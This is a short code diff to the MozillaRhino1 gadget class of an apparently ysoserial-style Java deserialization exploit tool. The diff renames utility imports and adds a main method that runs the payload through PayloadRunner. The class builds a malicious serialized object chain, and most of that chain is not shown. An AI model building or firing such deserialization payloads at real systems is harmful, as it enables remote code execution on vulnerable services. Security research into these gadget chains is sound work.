@@ -1,13 +1,14 @@
 package A.R.ysogate.payloads.gadgets;
 
+import A.R.ysogate.payloads.utils.PayloadRunner;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import org.mozilla.javascript.*;
 import A.R.ysogate.payloads.ObjectPayload;
 import A.R.ysogate.payloads.annotation.Authors;
 import A.R.ysogate.payloads.annotation.Dependencies;
-import A.R.ysogate.payloads.util.Gadgets;
-import A.R.ysogate.payloads.util.JavaVersion;
-import A.R.ysogate.payloads.util.Reflections;
+import A.R.ysogate.payloads.utils.Gadgets;
+import A.R.ysogate.payloads.utils.JavaVersion;
+import A.R.ysogate.payloads.utils.Reflections;
 
 import javax.management.BadAttributeValueExpException;
 import java.lang.reflect.Constructor;
@@ -61,6 +62,10 @@ public class MozillaRhino1 implements ObjectPayload<Object> {
 		valField.set(badAttributeValueExpException, idScriptableObject);
 
 		return badAttributeValueExpException;
+	}
+
+	public static void main(final String[] args) throws Exception {
+		PayloadRunner.run(MozillaRhino1.class, args);
 	}
 	public static boolean isApplicableJavaVersion() {
 		return JavaVersion.isBadAttrValExcReadObj();
